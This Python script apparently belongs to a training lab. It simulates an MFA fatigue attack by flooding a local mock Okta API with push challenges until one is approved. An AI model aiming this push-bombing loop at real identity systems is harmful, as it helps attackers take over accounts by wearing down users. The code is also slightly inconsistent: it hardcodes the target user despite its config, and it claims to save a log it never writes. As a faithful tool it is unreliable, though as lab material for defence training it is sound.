#  simulator.py
#  MFA fatigue attacker script.
#  Run this AFTER mock_okta_api.py is running.

import os
import time
from datetime import datetime

import requests

# Pull in our settings
from config import TARGET_URL, TARGET_USER, BURST_SIZE, INTERVAL_SECONDS, LOG_FILE


def send_push(attempt_number: int) -> dict:
    """
    Send one push notification request to the mock Okta API.
    Returns the API's response as a dict.
    """
    token = os.getenv("NETSTRIKE_ACTION_API_TOKEN")
    if not token:
        raise RuntimeError("NETSTRIKE_ACTION_API_TOKEN is required")
    payload = {
        "action_id": "identity.mfa.challenge.record",
        "target": {"type": "identity", "id": "sarah"},
        "idempotency_key": f"mfa-challenge-{attempt_number}",
        "parameters": {},
        "dry_run": False,
        "timeout_seconds": 5,
    }

    try:
        response = requests.post(
            TARGET_URL,
            json=payload,
            headers={"Authorization": f"Bearer {token}"},
            timeout=5,
        )
        response.raise_for_status()
        result = response.json()
        outcome = result.get("effects", [""])[0]
        return {
            "approved": outcome.endswith("approved"),
            "attempt_number": attempt_number,
        }

    except requests.exceptions.ConnectionError:
        print("\n[!] ERROR: Could not connect to the mock Okta API.")
        print("[!] Make sure mock_okta_api.py is running in another terminal.")
        print("[!] Run:  python mock_okta_api.py\n")
        exit(1)

    except requests.exceptions.Timeout:
        print(f"[!] Push #{attempt_number} timed out. Skipping.")
        return {"approved": False, "attempt_number": attempt_number}


def run_simulation():
    print("=" * 55)
    print("  MFA FATIGUE SIMULATOR")
    print("=" * 55)
    print(f"  Target user  : {TARGET_USER}")
    print(f"  Burst size   : {BURST_SIZE} pushes")
    print(f"  Interval     : {INTERVAL_SECONDS}s between each push")
    print(f"  API endpoint : {TARGET_URL}")
    print("=" * 55)
    print()

    attack_succeeded = False

    for i in range(1, BURST_SIZE + 1):
        timestamp = datetime.utcnow().isoformat() + "Z"
        print(f"  [{timestamp}] Sending push #{i}...", end=" ")

        result = send_push(i)
        approved = result.get("approved", False)

        if approved:
            print(f"✅ APPROVED on attempt #{i}!")
            attack_succeeded = True
            break
        else:
            print(f"❌ denied")

        # Wait before next push (skip wait after the last one)
        if i < BURST_SIZE:
            time.sleep(INTERVAL_SECONDS)

    print()
    print("=" * 55)
    if attack_succeeded:
        print(f"  [RESULT] Attack SUCCEEDED — victim approved push.")
        print(f"  [RESULT] Credentials are now compromised.")
    else:
        print(f"  [RESULT] Attack FAILED — victim did not approve")
        print(f"           after {BURST_SIZE} attempts.")
    print(f"  [LOG]    Saved to {LOG_FILE}")
    print("=" * 55)


if __name__ == "__main__":
    run_simulation()
